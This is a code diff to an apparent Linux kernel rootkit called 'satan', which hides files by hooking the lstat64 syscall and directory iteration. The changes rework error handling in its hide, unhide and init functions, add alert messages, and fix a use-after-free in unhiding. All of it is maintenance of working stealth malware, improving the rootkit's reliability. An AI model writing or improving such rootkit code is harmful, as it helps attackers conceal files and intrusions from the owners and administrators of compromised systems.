@@ -93,7 +93,7 @@ asmlinkage long satan_lstat64(const char __user *filename,
 
 int satan_file_init(void)
 {
-        return satan_syscall_hook(__NR_lstat64, satan_lstat64) == 0;
+        return satan_syscall_hook(__NR_lstat64, satan_lstat64);
 }
 
 void satan_file_exit(void)
@@ -133,8 +133,11 @@ int satan_file_hide(const char *path)
         // hidden_files_list, then hidden_files_list_add() will
         // return 0 and place the address of the newly added
         // struct hidden_file in f.
-        return hidden_files_list_add(path, &f) == 0 &&
-               satan_file_hook_iterate_shared(f) == 0;
+        if (hidden_files_list_add(path, &f) != 0) {
+                return 1;
+        }
+
+        return satan_file_hook_iterate_shared(f);
 }
 
 /**
@@ -145,11 +148,23 @@ int satan_file_hide(const char *path)
  */
 int satan_file_unhide(const char *path)
 {
-        struct hidden_file *f = NULL;
+        struct hidden_file *f = hidden_files_list_get(path);
 
-        return (f=hidden_files_list_get(path)) != NULL && 
-               satan_file_unhook_iterate_shared(f) == 0 &&
-               hidden_files_list_del(path) == 0;
+        if (!f) {
+                pr_alert("satan: file: %s has not been hidden before\n", path);
+                return 1;
+        }
+
+        // Unhooking iterate_shared() requires the existence of f,
+        // and hidden_files_list_del() will kfree(f).
+        // Therefore, we should only del f from the list
+        // after unhooking iterate_shared(), otherwise
+        // there will be a use-after-free bug.
+        if (satan_file_unhook_iterate_shared(f) != 0) {
+                return 1;
+        }
+
+        return hidden_files_list_del(path);
 }
 
 
@@ -216,8 +231,10 @@ static int hidden_files_list_del(const char *path)
 {
         struct hidden_file *f = hidden_files_list_get(path);
 
-        if (!f)
+        if (!f) {
+                pr_alert("satan: file: %s has not been hidden\n", path);
                 return 1;
+        }
 
 
         pr_info("satan: file: removing (%s,%s) from list of hidden files.\n", f->basename, f->filename);
